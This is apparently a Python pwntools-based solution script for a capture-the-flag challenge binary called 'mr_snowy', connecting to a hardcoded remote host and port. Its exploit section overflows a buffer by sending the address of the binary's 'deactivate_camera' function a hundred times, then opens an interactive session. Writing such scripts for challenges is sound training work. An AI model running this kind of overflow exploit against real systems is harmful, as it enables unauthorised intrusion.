#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

from rootkit import *
import os
import time

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('./mr_snowy')
host = args.HOST or '138.68.147.151'
port = int(args.PORT or 30955)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

time.sleep(5)
re()
sl(b"1")
time.sleep(5)
re()
sl(p(exe.sym['deactivate_camera'])*100)
time.sleep(5)
print(re())
io.interactive()
